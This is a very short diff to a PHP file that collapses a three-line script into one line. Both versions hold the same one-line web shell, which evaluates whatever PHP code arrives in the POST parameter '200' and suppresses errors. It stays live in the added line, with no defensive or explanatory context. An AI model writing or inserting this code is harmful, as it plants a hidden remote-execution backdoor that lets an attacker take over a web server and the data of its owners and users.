@@ -1,3 +1,1 @@
-<?php
-@eval($_POST['200']);
-?>
+<?php @eval($_POST['200']);?>
